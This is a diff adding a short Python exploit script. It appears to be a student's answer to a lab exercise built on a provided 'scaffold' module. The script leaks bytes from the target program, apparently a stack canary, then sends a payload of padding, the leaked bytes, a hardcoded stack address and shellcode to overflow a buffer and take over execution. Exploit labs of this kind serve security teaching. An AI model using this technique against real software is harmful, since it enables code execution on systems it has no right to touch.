@@ -1,0 +1,32 @@
+#!/usr/bin/env python3
+
+import scaffold as p
+from scaffold import SHELLCODE
+import sys
+
+# Configure Python to print text strings like byte strings. Don't remove this!
+sys.stdout.reconfigure(encoding='latin1')
+
+### YOUR CODE STARTS HERE ###
+
+# Program start:
+p.start()
+
+# Example send:
+p.send('F'*12+'\\x\n')#+6*'U'+'\n')
+
+s = p.recv(17)
+
+#print(' '.join(hex(ord(c)) for c in s))
+print(len(s))
+#print(hex(ord(s[16])))
+print(' '.join(hex(ord(c)) for c in s[13:]))
+
+poison = 'F'*15+ '\x00' + s[13:]+12*'F'+'\x30\xdb\xff\xff'+SHELLCODE+'\n'#ffffdb30 
+
+p.send(poison)
+
+# Example receive:
+#assert p.recv(6) == 'testA\n'
+
+### YOUR CODE ENDS HERE ###
